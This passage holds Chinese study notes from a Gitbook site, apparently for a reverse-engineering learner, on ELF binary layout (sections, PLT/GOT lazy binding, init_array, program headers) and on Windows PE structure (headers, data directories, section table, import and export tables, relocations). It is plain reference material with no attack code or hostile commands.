NOTE 0000000000400274 000274 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 0000000000400298 000298 00001c 00 A 5 0 8 [ 5] .dynsym DYNSYM 00000000004002b8 0002b8 000060 18 A 6 1 8 [ 6] .dynstr STRTAB 0000000000400318 000318 00003f 00 A 0 0 1 [ 7] .gnu.version VERSYM 0000000000400358 000358 000008 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 0000000000400360 000360 000020 00 A 6 1 8 [ 9] .rela.dyn RELA 0000000000400380 000380 000030 18 A 5 0 8 [10] .rela.plt RELA 00000000004003b0 0003b0 000018 18 AI 5 22 8 [11] .init PROGBITS 00000000004003c8 0003c8 000017 00 AX 0 0 4 [12] .plt PROGBITS 00000000004003e0 0003e0 000020 10 AX 0 0 16 [13] .text PROGBITS 0000000000400400 000400 000182 00 AX 0 0 16 [14] .fini PROGBITS 0000000000400584 000584 000009 00 AX 0 0 4 [15] .rodata PROGBITS 0000000000400590 000590 000010 00 A 0 0 4 [16] .eh_frame_hdr PROGBITS 00000000004005a0 0005a0 00003c 00 A 0 0 4 [17] .eh_frame PROGBITS 00000000004005e0 0005e0 000100 00 A 0 0 8 [18] .init_array INIT_ARRAY 0000000000600e10 000e10 000008 08 WA 0 0 8 [19] .fini_array FINI_ARRAY 0000000000600e18 000e18 000008 08 WA 0 0 8 [20] .dynamic DYNAMIC 0000000000600e20 000e20 0001d0 10 WA 6 0 8 [21] .got PROGBITS 0000000000600ff0 000ff0 000010 08 WA 0 0 8 [22] .got.plt PROGBITS 0000000000601000 001000 000020 08 WA 0 0 8 [23] .data PROGBITS 0000000000601020 001020 000010 00 WA 0 0 8 [24] .bss NOBITS 0000000000601030 001030 000008 00 WA 0 0 1 [25] .comment PROGBITS 0000000000000000 001030 000029 01 MS 0 0 1 [26] .symtab SYMTAB 0000000000000000 001060 0005b8 18 27 43 8 [27] .strtab STRTAB 0000000000000000 001618 0001cc 00 0 0 1 [28] .shstrtab STRTAB 0000000000000000 0017e4 000103 00 0 0 1 .init和.fini节 .init .init节中包含可执行代码，用来初始化程序。在程序将控制权移动到main函数之前，由init里的代码掌握。可以看作是构造函数。 .fini节 在程序执行结束之后执行的，和析构函数一样。 .text节 该节包含了程序的主要代码。 一般来说，可执行的节是不可写的，可写的是不可执行的（出于安全考虑） 在本例中（标准gcc编译的程序）中text节中包含多个开始任务和结束任务的标准函数： _start register_tm_clones frame_dummy这仨比较重要。 _start 函数 通过objdump -M intel -d learnS可以看到不同函数的反汇编。 在地址0x400424的地址处，调用了__libc_start_main函数，这里查看rdi寄存器，可以看到是程序main函数的地址。 这就是为什么gdb里下断点会下在这里，查看rdi的值获得main函数的地址 .bss和.data还有.rodata 因为代码节不可写，所以变量会保存在多个可写的专用节中。 .rodata read only data代表.rodata ，用来存储常量。 .data 初始化变量的默认值存放在这个节里。因为变量会被修改，所以标记为可写的节。 .bss 为了未初始化变量保留的空间，该节不会占用磁盘上的空间，只在二进制文件创建执行环境的时候为没有初始化的变量分配内存。该节是可写的。 延迟绑定plt、got plt表：（过程链接表）Procedure Linkage Table； got表：（全局偏移表）Gobal Offset Table； 为什么要延迟绑定：保证了动态链接器不会在重定位上浪费时间，只在需要的时候执行。 注意：若程序有实时性能的要求，则可以通过在bash中exportLD_BIND_NOW=1来取消动态绑定。 .got.plt（GOT表）这是一个单独的节，是运行时可写的，如果程序开启了RELRO（重定位只读）防御got表覆盖攻击，那么got表不可写，这时就将会变化的值放在了这个表中，方便运行时改变。 .plt.got（PLT表）这是一个备用的plt表，他的大小是8字节，在开启got不可写之后该表会代替16字节的plt表。 got节用于引用数据项，got,plt节用来存放通过plt访问（已经解析的）的库函数地址 执行流程 00000000004003e0 : 4003e0: ff 35 22 0c 20 00 push QWORD PTR [rip+0x200c22] # 601008 4003e6: ff 25 24 0c 20 00 jmp QWORD PTR [rip+0x200c24] # 601010 4003ec: 0f 1f 40 00 nop DWORD PTR [rax+0x0] 00000000004003f0 : 4003f0: ff 25 22 0c 20 00 jmp QWORD PTR [rip+0x200c22] # 601018 4003f6: 68 00 00 00 00 push 0x0 4003fb: e9 e0 ff ff ff jmp 4003e0 通过命令objdump -M intel --section .plt -d learnS可以看到上面的汇编结构。 地址4003e0处作为 “默认存根” 地址4003f0处作为“函数存根” plt存根以间接跳转指令开头，这导致他跳转到存储在.got.plt节中的地址（4003f0处的行为）。 在延迟绑定之前，该地址是函数存根下一条（push）指令的地址，间接跳转将控制权交给地址4003f6. 将0x0压入栈中（这是plt存根的标识符）。 4003fb地址的行为跳转到所有plt函数存根之间共享的通用默认存根。 默认存根push另一个标识符（从got中获得）表示可执行文件自身。间接的通过got跳转到动态链接器。 标识符 通过push plt存根的标识符，动态链接器可以确定puts函数的位置，并且这样还代表main函数已经加载到内存中了。 重要的是：同一个进程中会加载多个库，每一个库都有自己的PLT和GOT，动态链接器会寻找puts函数的地址，将函数的地址插入与put@plt相关的got条目中，完成延迟绑定。 GOT存在的意义 对于每个进程来说，相同的库代码也会映射到不同的虚拟地址中，所以不能直接将解析库函数的地址修补到程序中。因为该地址只在该进程的上下文起作用。但是每个进程都有got表的专用副本，这就可以了。 安全问题。 .dynamic节 充当的是操作系统和动态链接器的“路线图”，具体内容我觉的没啥用，不写了。 .init_array 节 包含一个指向构造函数的指针数组，在main函数被调用前会执行的一系列的构造函数。 init节包含可执行代码 init_array节是一个包含了“所需数量的函数指针”的数据节，也包括了指向自定义构造函数的指针， 在GCC中，可以通过 __attribute__((constructor)) 来修饰函数，将其标记为构造函数。 通过命令objdump -M intel --section .init_array -d learnS,看到该程序中的构造函数只有一个 验证得到： ​ 地址正好指向了函数，这是一个默认的初始化函数，在ida中查看该函数 .fini_array 节 作用和上述.init_array节相反，存放的是一些“析构函数”的指针。 这个程序的析构函数是0x4004b0地址处的函数。 另外：这两个节区的指针很容易被修改，所以是一个方便下钩子（hook）的地方。钩子将初始化甚至结束代码添加到二进制程序中并修改他的行为。 .shstrtab和.dynsym还有.dynstr节区 .shstrtab：一个以NULL结尾的字符串数组，包含了二进制文件中所有节的名称，并根据节头进行索引。可以帮助readelf之类的工具找到节的名称。 .dynsym还有.dynstr：包含了动态链接需要的符号和字符串，所以是不能去掉的。 可以用strip filename的形式去除表中的符号。 程序头 从相同的文件中找到关于elf程序头的定义 typedef struct { Elf32_Word p_type; /* Segment type */ Elf32_Off p_offset; /* Segment file offset */ Elf32_Addr p_vaddr; /* Segment virtual address */ Elf32_Addr p_paddr; /* Segment physical address */ Elf32_Word p_filesz; /* Segment size in file */ Elf32_Word p_memsz; /* Segment size in memory */ Elf32_Word p_flags; /* Segment flags */ Elf32_Word p_align; /* Segment alignment */ } Elf32_Phdr; typedef struct { Elf64_Word p_type; /* Segment type */ Elf64_Word p_flags; /* Segment flags */ Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment */ } Elf64_Phdr; 程序头表提供的是段的视图 通过命令readelf --wide --segments learnS可以看到程序中的程序头 通过下的描述可以发现，段是由节简单的捆绑组成的。 对于重要的字段进行说明。 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000040 0x0000000000400040 0x0000000000400040 0x0001f8 0x0001f8 R 0x8 INTERP 0x000238 0x0000000000400238 0x0000000000400238 0x00001c 0x00001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x000000 0x0000000000400000 0x0000000000400000 0x0006e0 0x0006e0 R E 0x200000 LOAD 0x000e10 0x0000000000600e10 0x0000000000600e10 0x000220 0x000228 RW 0x200000 DYNAMIC 0x000e20 0x0000000000600e20 0x0000000000600e20 0x0001d0 0x0001d0 RW 0x8 NOTE 0x000254 0x0000000000400254 0x0000000000400254 0x000044 0x000044 R 0x4 GNU_EH_FRAME 0x0005a0 0x00000000004005a0 0x00000000004005a0 0x00003c 0x00003c R 0x4 GNU_STACK 0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW 0x10 GNU_RELRO 0x000e10 0x0000000000600e10 0x0000000000600e10 0x0001f0 0x0001f0 R 0x1 p_type 标识了段的类型，该字段存在三个重要的类型： PT_LOAD PT_DYNAMIC PT_INTERP PT_LOAD 具有该表示的段在创建进程 时候会加载到内存中去，在上述代码中可以看到有两个具有 LOAD标识的段，一个包含了可写数据节（off:0x000e10），一个包含不可写数据节(off:0x000000)。 PT_INTERP & PT_INTERP 该段包含了.INTERP节，该节提供了加载二进制文件解释器的名称；PT_INTERP段包含了.dynamic节，该节通知解释器如何运行该二进制文件。 其他的就不重要了。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-11-19 13:13:18 "},"MyArticles/Basics/Pe File Structer.html":{"url":"MyArticles/Basics/Pe File Structer.html","title":"PE structure","keywords":"","body":"写在前面 微软基于COFF（通用项目文件格式）来设计的可执行文件，本篇学习笔记是基于《黑客免杀攻防》一书来学习记录的，之前有一篇记录是基于《逆向工程核心原理》写的逆向工程学习-PE文件格式 | R-o-o-t-k-i-t (hellorootkit.github.io)这两篇相互独立，只不过是不同的时间再次学习一下罢了。 可以在文件WinNt.h文件中找到。 一些缩写。 RAW：文件偏移 RVA：相对虚拟地址（是指相对与ImageBase的偏移） VA：虚拟地址，也就是程序被加载到内存中的地址 利用010editor 首先下载对应的模板，然后在010里运行模板，然后alt+f4显示模板变量，这样看起来比较方便，效果如下： 这里分析起来结构就如虎添翼了。 MS-DOS头 普遍存在于PE文件中的一个没啥用的节区，当PE文件运行在dos系统（DOS作为微软公司在个人计算机上使用的一个操作系统载体，1981年 - 1995年）时会执行，告诉你这个程序不能在dos系统里执行。在winnt.h文件的14889行可以找到DOS头的信息 // DOS .EXE header typedef struct _IMAGE_DOS_HEADER{ WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; e_magic 就是4D 5A这两个字节，表示这是一个DOS下的可执行文件 e_ss; e_sp…… 这两个值用来在程序开始的时候初始化SS SP的两个寄存器的值，剩下的后面的几个就是初始化各个对应的寄存器的值。 e_lfarlc 这个头指向了程序中重定位表的地址 e_lfanew 这个值指向的是PE文件头（NT头）的偏移，这个数字的偏移是0x3c（从MZ那开始算起） DOS签名 这里就是一串字符串，和一些汇编代码，可以在dos里显示出这个字符串的汇编代码。 PE头（NT头） 在哪个头文件的15186行可以找对对应的描述 typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; typedef struct _IMAGE_NT_HEADERS { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader; } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 不论是64位的程序还是32位的程序，这个结构体包含的内容基本是一样的。 Signature DWORD Signature; 这个字段由四个字节组成PE\\x00\\x00 IMAGE_FILE_HEADER IMAGE_FILE_HEADER FileHeader; 这个结构中包含了整个PE文件的概览信息，文件的15006行。 typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; Machine 一个两字节的值，表示了该程序运行在何种CPU上。在15034行可以看到宏定义，很重要的值，但是利用起来没啥用。 #define IMAGE_FILE_MACHINE_UNKNOWN 0 #define IMAGE_FILE_MACHINE_I386 0x014c // Intel 386. #define IMAGE_FILE_MACHINE_R3000 0x0162 // MIPS little-endian, 0x160 big-endian #define IMAGE_FILE_MACHINE_R4000 0x0166 // MIPS little-endian #define IMAGE_FILE_MACHINE_R10000 0x0168 // MIPS little-endian #define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 // MIPS little-endian WCE v2 #define IMAGE_FILE_MACHINE_ALPHA 0x0184 // Alpha_AXP #define IMAGE_FILE_MACHINE_SH3 0x01a2 // SH3 little-endian #define IMAGE_FILE_MACHINE_SH3DSP 0x01a3 #define IMAGE_FILE_MACHINE_SH3E 0x01a4 // SH3E little-endian #define IMAGE_FILE_MACHINE_SH4 0x01a6 // SH4 little-endian #define IMAGE_FILE_MACHINE_SH5 0x01a8 // SH5 #define IMAGE_FILE_MACHINE_ARM 0x01c0 // ARM Little-Endian #define IMAGE_FILE_MACHINE_THUMB 0x01c2 // ARM Thumb/Thumb-2 Little-Endian #define IMAGE_FILE_MACHINE_ARMNT 0x01c4 // ARM Thumb-2 Little-Endian #define IMAGE_FILE_MACHINE_AM33 0x01d3 #define IMAGE_FILE_MACHINE_POWERPC 0x01F0 // IBM PowerPC Little-Endian #define IMAGE_FILE_MACHINE_POWERPCFP 0x01f1 #define IMAGE_FILE_MACHINE_IA64 0x0200 // Intel 64 #define IMAGE_FILE_MACHINE_MIPS16 0x0266 // MIPS #define IMAGE_FILE_MACHINE_ALPHA64 0x0284 // ALPHA64 #define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 // MIPS #define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 // MIPS #define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64 #define IMAGE_FILE_MACHINE_TRICORE 0x0520 // Infineon #define IMAGE_FILE_MACHINE_CEF 0x0CEF #define IMAGE_FILE_MACHINE_EBC 0x0EBC // EFI Byte Code #define IMAGE_FILE_MACHINE_AMD64 0x8664 // AMD64 (K8) #define IMAGE_FILE_MACHINE_M32R 0x9041 // M32R little-endian #define IMAGE_FILE_MACHINE_CEE 0xC0EE NumberOfSections 这个文件中节区的数目，如果说要新增一个节区的话，就要更改这里。 TimeDateStamp 文件的时间戳，在样本分析中可以根据时间戳来进行画像和溯源，这是比系统的日期和时间更加精确的时间。 可以看到都精确到秒了。 NumberOfSymbols 符号表中的符号的数量，COFF文件的符号表 长度固定，只有通过这个结构才能算出来符号表的结尾 SizeOfOptionalHeader 可选头（拓展头）的大小，这个头就在该结构体的后面。可以通过这个大小来判断32位（E0 00）和64位（F0 00）。 Characteristics 这个字段阐述了PE文件的属性，这个值是由众多的属性的值组合成的一个数字，看起来只有两个字节，但是包含了很多的二进制文件的属性。 IMAGE_OPTIONAL_HEADER 从这个块开始，就开始复杂了，就真正进入PE文件结构的核心了。 IMAGE_OPTIONAL_HEADER64 OptionalHeader; 为什么叫可选头，虽然他是必须的，没有就寄了。这是因为文件结构的设计是仿照的COFF文件，所以就传下来了这么一个不合理的名称。 这个头在64位和32位的程序中的结构不同（上面说了，大小不同，所以结构肯定不一样啊）。 这两个头合并成为PE文件头 typedef struct _IMAGE_OPTIONAL_HEADER { // // Standard fields. // WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; // // NT additional fields. // DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; // 64位的程序的结构 typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; Magic 文件类型标识，这个分开了PE32+文件（0x020b）,ROM文件（0x0170）,普通可执行文件（0x010b）。 MajorLinkerVersion 链接器的主版本号 MinorLinkerVersion 链接器的子版本号 SizeOfCode 所有的IMAGE_SCN_CNT_CODE的属性的代码的总大小，这是磁盘扇区字节数的整倍数计算，15353行 #define IMAGE_SCN_CNT_CODE 0x00000020 // Section contains code. 就是节区中包含可执行的代码的属性，相当于是可执行属性 AddressOfEntryPoint 程序执行入口RVA地址，一般指向运行时库代码，程序的main之类的入口点由这些库函数调用；在DLL文件中，这个值一般设置为0。 BaseOfCode 代码段的RVA地址，下面那个是数据段的代码段DataOfCode ImageBase 文件装入内存的首选地址，加载器会首先尝试在这个地址加载文件，加载成功就跳过装载器的重定位过程，如果这个地址在内存中被占用的话，装载器就会重新找一个合法的地址装载文件。 SizeOfImage 映像装入内存之后的大小，从ImageBase到最后一个区段的总大小 SizeOfHeaders 前面这些个各种头的总大小 CheckSum 映像文件的校验和，这个对于一般的文件没啥要求，一般就是0，但是对于内核模式的驱动和系统dll的这个值必须有这个合适的值 IMAGE_DATA_DIRECTORY #define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16 // 15047行 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; PE文件中各种数据结构的索引目录，由数个结构相同的IMAGE_DATA_DIRECTORY组成 typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 在文件中是这么描述的 #define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory #define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory #define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory #define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory #define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory #define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table #define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory // IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage) #define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data #define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP #define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory #define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers #define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table #define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors #define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor IMAGE_DIRECTORY_ENTRY_SECURITY 安全目录，一般用来存放数字签名或者证书之类的。 IMAGE_DIRECTORY_ENTRY_BASERELOC 基址重定位表，存放这一个偏移，是需要执行重定位的代码的偏移信息 IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 绑定输入目录，存储的是一些API绑定信息，这些可以加速程序的加载时间。 IMAGE_DIRECTORY_ENTRY_IAT 导入地址表，保存导入函数的真正地址 节表（区块表） 该表用来描述后面的这些个区段的各种属性，一个PE文件起码要一个节区才能跑，哪怕剩一个也得剩下text节区，连代码段都没了，跑尼玛呢。 该表由首位相连的数个结构相同的结构体构成 可以看到这个表的主要构成就是一堆IMAGE_SECTION_HEADER结构体构成，每一个结构体代表了之后的一个节区 IMAGE_SECTION_HEADER typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; Name 这个字段就是阐述的该节的名称，一个8字节的字符串，开头一般都是.，如果用$开头的同名的区段会合并成一个区段。 VirtualSize 这个和PhysicalAddress字段在一个联合体中，在obj文件中他的值是0x00000000; 其他文件表示的是该节区实际被使用的区段大小（没有经过对齐）。 VirtualAddress 文件载入内存中的RVA，这个地址是按照页内存对齐的，永远是可选头中的SectionAlignment的整数倍。 SizeOfRawData 这个区段在文件中的占用磁盘的大小，按照页内存对齐的，永远是可选头中的FileAlignment的整倍数 PointerToRawData 该区段在文件中的偏移 PointerToRelocations 该区段重定位表的偏移，指向了IMAGE_RELOCATION结构数组 IMAGE_RELOCATION typedef struct _IMAGE_RELOCATION { union { DWORD VirtualAddress; DWORD RelocCount; // Set to the real count when IMAGE_SCN_LNK_NRELOC_OVFL is set } DUMMYUNIONNAME; DWORD SymbolTableIndex; WORD Type; } IMAGE_RELOCATION; typedef IMAGE_RELOCATION UNALIGNED *PIMAGE_RELOCATION; Characteristics 阐述了区段的一些属性，比如读写情况和其他状态。这些属性有些事可以合并的，在程序中可以通过|来合并属性 区段的命名 区段名称可以自定义，但是一般是使用默认的区段名称。 可以通过如下形式对程序中的数据段进行改名。 #pragma data_seg(\"任意的名字\"); 区段的对齐 在文件中不论是什么内容，都要遵守一个页对齐的规则。对于PE文件来说，只要是2的倍数就可以 以text区段为例 看到这个段的VirtualSize是0x1d18，然后再看VirtualAddress和SizeOfRawData这两个字段 VirtualAddress：0x1000 所以这个区段在内存中的大小应该是0x2000，缺的字节用0x00补齐。用x64dbg可以证明： SizeOfRawData：0x1E00 根据上述大小，这个区段在硬盘中的大小应该是0x1E00的整倍数，所以理论上应该是0x1E00。 后续： 根据书上介绍，后面的内容都会教你如何定位，但是现在的CFF，PE studio这么方便，没必要再去研究怎么手动定位了。 IMAGE_EXPORT_DIRECTORY（导出表） 在头文件的16148行找到了这个结构体的描述 typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; //默认是0，作为保留值 DWORD TimeDateStamp; //导出表创建时间 WORD MajorVersion; WORD MinorVersion; DWORD Name; //指向模块的名称的RVA地址 DWORD Base; DWORD NumberOfFunctions; //导出地址表（EAT）中成员个数 DWORD NumberOfNames; //导出名称表（ENT）中成员个数 DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 导出表主要是存放的程序的导出函数，exe文件一般没有这个表，普遍存在dll文件中。 不知道为啥，这个资料用了很大的章节来阐述如何定位到导出表……， 导出表在逻辑上分为三部分：名称表；序号表；函数表。 调用者通过前两者进行索引，找到真正的函数表。我们平时调用dll时用到的序号，需要减去DWORD Base;的值才能得到真正的保存的序号。但是不知道这个有什么实际用处 IMAGE_IMPORT_DIRECTORY（导入表） 这个表是重要的一个表。这个表存在的意义是：该程序调用第三方API函数供本地使用的调用机制。这个表普遍存在于PE文件中。 typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // 输入表名称（INT）的RVA } DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; // 指出导入此映像文件的名字 DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses) } IMAGE_IMPORT_DESCRIPTOR; 该结构并不能完成PE文件整个的导入文件，只是帮助装载器找到程序真正的保存有导入信息的结构。真正保存导入函数的是如下两个结构体_IMAGE_IMPORT_BY_NAME和_IMAGE_THUNK_DATA。16166行 typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; CHAR Name[1]; } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; typedef struct _IMAGE_THUNK_DATA64 { union { ULONGLONG ForwarderString; // 转发字符串的RVA ULONGLONG Function; // 被导出函数的地址 ULONGLONG Ordinal; ULONGLONG AddressOfData; // PIMAGE_IMPORT_BY_NAME } u1; } IMAGE_THUNK_DATA64; typedef struct _IMAGE_THUNK_DATA32 { union { DWORD ForwarderString; // PBYTE DWORD Function; // PDWORD DWORD Ordinal; DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME } u1; } IMAGE_THUNK_DATA32; IMAGE_IMPORT_DIRECTORY结构的个数由导入函数的数量决定，最后以一个空的IMAGE_IMPORT_DIRECTORY结构结尾 这个实例程序中只有两个结构，一个是kernel32的一个是msvcrt的 包含最后一个空结构： OriginalFirstThunk 包含指向INT的RVA，INT就是一个_IMAGE_THUNK_DATA类型的数组，结尾是一个空的_IMAGE_THUNK_DATA结构体；一般情况下，每一个_IMAGE_THUNK_DATA结构会指向_IMAGE_IMPORT_BY_NAME结构。 _IMAGE_IMPORT_BY_NAME结构体 typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; // 导入表需要导入的函数的符号 CHAR Name[1]; // 导入表需要导入的函数的名称 } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; 该结构最后也是一个全空的结构体结尾， FirstThunk 指向导入地址表（IAT）的RVA地址 异常 异常目录常用来存放用于描述异常处理的相关的异常处理函数、SEH相关的地址等信息，这些信息一般位于pdata区段中。 PE文件结构中的异常目录目前只在： X64 ARMv7 ARM MIPS PowerPC 这些平台上才有实际作用。 在16551行可以找到这个结构体的描述 typedef struct _IMAGE_RUNTIME_FUNCTION_ENTRY { DWORD BeginAddress; // SEH代码起始地址 DWORD EndAddress; // SEH代码的结束地址 union { DWORD UnwindInfoAddress; DWORD UnwindData; } DUMMYUNIONNAME; } _IMAGE_RUNTIME_FUNCTION_ENTRY, *_PIMAGE_RUNTIME_FUNCTION_ENTRY; 安全 数据目录的IMAGE_DIRECTORY_ENTRY_SECURITY指向这个结构。这个目录也被称为“安全目录”或者“属性证书目录”，一般存放的是文件的数字签名。 安全目录结构 在wintrust.h文件中1398行可以找到描述 typedef struct _WIN_CERTIFICATE { DWORD dwLength; // 当前结构体的长度 WORD wRevision; // 签名的版本号 WORD wCertificateType; // WIN_CERT_TYPE_xxx BYTE bCertificate[ANYSIZE_ARRAY]; // 包含了许多证书 } WIN_CERTIFICATE, *LPWIN_CERTIFICATE; 基质重定向表 在运行的时候，总是exe文件被优先加载，所以这个表普遍存在于dll文件中，当exe文件或者其他文件运行占据了dll的默认地址，就会进行重定向。 一般情况下.reloc的段中存在这个基址重定位表；将PE文件中所有需要重定位的地址放在一个数组里。 IMAGE_BASE_RELOCATION typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; DWORD SizeOfBlock; // WORD TypeOffset[1]; } IMAGE_BASE_RELOCATION; 在一个PE文件中，重定位结构由众多的上述结构组成。根据书上说：每个这个结构管理的只有4kb大小的分页内的重定位信息，PE文件中每隔0x1000字节的大小就需要一个这个结构与其对应，所以这个结构中的VirtualAddress的值永远是0x1000的倍数。 调试 数据结构目录中的IMAGE_DIRECTORY_ENTRY_DEBUG结构指向了这个结构，该结构也被成为是调试目录，一般保存在.debug区段中。 IMAGE_DEBUG_DIRECTORY typedef struct _IMAGE_DEBUG_DIRECTORY { DWORD Characteristics; // 保留字段 DWORD TimeDateStamp; // 调试数据建立的时间和日期 WORD MajorVersion; WORD MinorVersion; DWORD Type; DWORD SizeOfData; DWORD AddressOfRawData; // 加载到内存的调试数据RVA DWORD PointerToRawData; // 调式数据的文件偏移 } IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY; 这个结构体不是很严格，在type里可以自定义一些类型，但是我也没有实际操作，所以我不清楚这个节区具体有什么用处 TLS 见另一笔记，本篇只用来记录PE结构的一些内容。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-02-13 15:26:36 